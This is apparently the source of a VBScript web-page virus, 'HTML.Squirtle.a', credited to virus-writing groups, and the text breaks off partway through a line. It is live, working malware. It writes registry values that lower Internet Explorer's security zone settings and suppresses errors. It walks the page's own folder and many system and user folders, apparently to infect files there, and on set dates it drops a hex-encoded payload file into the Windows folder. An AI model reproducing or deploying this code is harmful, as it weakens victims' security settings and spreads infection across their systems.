<!--Squirtle-->
<HTML>
<BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>

<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.Squirtle.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set TRange = document.body.createTextRange()
  HPath = Replace(location.href, "/", "\")
  Set FSO = CreateObject("Scripting.FileSystemObject")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")	
End If
If Day(Now()) = 6 or Day(Now()) = 12 or Day(Now()) = 24  Then
  Set DropSquirtle = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropSquirtle.WriteLine "n Squirt.jpg"
  DropSquirtle.WriteLine "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 48 "
  DropSquirtle.WriteLine "e 0110 00 48 00 00 ff db 00 43 00 0f 0a 0b 0d 0b 09 0f "
  DropSquirtle.WriteLine "e 0120 0d 0c 0d 11 10 0f 11 16 25 18 16 14 14 16 2d 20 "
  DropSquirtle.WriteLine "e 0130 22 1b 25 35 2f 38 37 34 2f 34 33 3b 42 55 48 3b "
  DropSquirtle.WriteLine "e 0140 3f 50 3f 33 34 4a 64 4b 50 57 5a 5f 60 5f 39 47 "
  DropSquirtle.WriteLine "e 0150 68 6f 67 5c 6e 55 5d 5f 5b ff db 00 43 01 10 11 "
  DropSquirtle.WriteLine "e 0160 11 16 13 16 2b 18 18 2b 5b 3d 34 3d 5b 5b 5b 5b "
  DropSquirtle.WriteLine "e 0170 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropSquirtle.WriteLine "e 0180 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropSquirtle.WriteLine "e 0190 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b ff c0 "
  DropSquirtle.WriteLine "e 01a0 00 11 08 00 36 00 2d 03 01 22 00 02 11 01 03 11 "
  DropSquirtle.WriteLine "e 01b0 01 ff c4 00 1a 00 00 02 03 01 01 00 00 00 00 00 "
  DropSquirtle.WriteLine "e 01c0 00 00 00 00 00 00 04 05 00 03 06 01 02 ff c4 00 "
  DropSquirtle.WriteLine "e 01d0 2c 10 00 02 02 02 02 01 02 04 05 05 00 00 00 00 "
  DropSquirtle.WriteLine "e 01e0 00 00 01 02 03 11 00 04 05 12 21 13 31 32 41 51 "
  DropSquirtle.WriteLine "e 01f0 81 06 52 61 91 b1 14 22 42 63 d1 ff c4 00 18 01 "
  DropSquirtle.WriteLine "e 0200 00 03 01 01 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropSquirtle.WriteLine "e 0210 02 03 04 01 00 ff c4 00 1f 11 00 02 02 02 02 03 "
  DropSquirtle.WriteLine "e 0220 01 00 00 00 00 00 00 00 00 00 00 01 02 11 03 12 "
  DropSquirtle.WriteLine "e 0230 13 21 22 31 32 04 ff da 00 0c 03 01 00 02 11 03 "
  DropSquirtle.WriteLine "e 0240 11 00 3f 00 c9 c5 73 37 44 52 49 f6 cd 6f 17 c0 "
  DropSquirtle.WriteLine "e 0250 eb 45 12 36 c8 f5 a5 ab a3 f0 8f b6 65 f4 1c 26 "
  DropSquirtle.WriteLine "e 0260 ec 08 2f e2 f3 8e 78 8d e9 93 f1 2c da b2 79 0f "
  DropSquirtle.WriteLine "e 0270 d9 bb 12 6e bc 50 fb 51 fd f0 e1 57 d8 bc 97 54 "
  DropSquirtle.WriteLine "e 0280 87 db 5a 3c 6c 30 17 9f 56 15 41 ee 7a 7f cc cc "
  DropSquirtle.WriteLine "e 0290 73 3c 7a 46 a2 6d 47 12 41 20 b5 20 dd 7d f3 4d "
  DropSquirtle.WriteLine "e 02a0 ce 47 b1 37 11 28 d3 2c 36 16 99 3a 9f 36 0e 22 "
  DropSquirtle.WriteLine "e 02b0 8f 52 68 bf 0e 88 76 90 c6 e9 ec 09 c6 4d 5f 54 "
  DropSquirtle.WriteLine "e 02c0 2b 1b 69 5d 8a 78 e9 bd 1b 8a 42 68 9b 17 f2 c3 "
  DropSquirtle.WriteLine "e 02d0 9e 50 2a 88 38 aa 4f 21 64 5b ed 7e df ae 16 b2 "
  DropSquirtle.WriteLine "e 02e0 76 50 71 51 c8 d2 a2 ad 51 46 9a b1 99 04 2a 5d "
  DropSquirtle.WriteLine "e 02f0 ef c0 03 1b 4d c9 6d 6a 4a ca 75 91 64 1e 0b 55 "
  DropSquirtle.WriteLine "e 0300 de 5c bb c9 06 98 30 c0 b1 33 1f ee 28 a0 7f 18 "
  DropSquirtle.WriteLine "e 0310 57 11 c9 3c b3 39 f3 d4 7b d7 d7 31 be 38 6c 2d "
  DropSquirtle.WriteLine "e 0320 f9 4a a8 5a 9c 97 2b b2 7a c0 92 13 fe b4 27 f9 "
  DropSquirtle.WriteLine "e 0330 c2 13 4b 61 59 64 e5 fd 5e 92 5a ac 61 c5 dd 7b "
  DropSquirtle.WriteLine "e 0340 9f a0 cd 18 e4 01 3d 3c 96 fa 62 fe 65 24 da 85 "
  DropSquirtle.WriteLine "e 0350 4a 80 24 43 6b 67 25 5f ad c9 d3 5d 0c e1 49 74 "
  DropSquirtle.WriteLine "e 0360 2b 1c 76 84 41 43 76 63 7e 6d b0 3e 4a 28 75 36 "
  DropSquirtle.WriteLine "e 0370 02 c0 58 a3 0b a6 f2 46 7b d6 d6 93 60 4a fb 4c "
  DropSquirtle.WriteLine "e 0380 f1 98 5e 8a 57 b8 fa de 31 fe a2 12 00 3d 4d 0a "
  DropSquirtle.WriteLine "e 0390 16 32 a9 ce 29 74 81 84 65 76 d8 94 4a fd 97 dc "
  DropSquirtle.WriteLine "e 03a0 aa 9b 03 0b d3 d8 4d 61 48 28 5d d0 fd 70 75 a0 "
  DropSquirtle.WriteLine "e 03b0 3c 63 7d 4e 3f 52 7d 1e e5 7a ca 3d 9c 1f 38 ad "
  DropSquirtle.WriteLine "e 03c0 1e 45 aa 0a 52 50 ec e1 e4 2a 44 34 7f 6c f7 2e "
  DropSquirtle.WriteLine "e 03d0 db 12 09 53 d4 7c f1 2e c4 b3 47 2b 47 62 d4 fb "
  DropSquirtle.Wri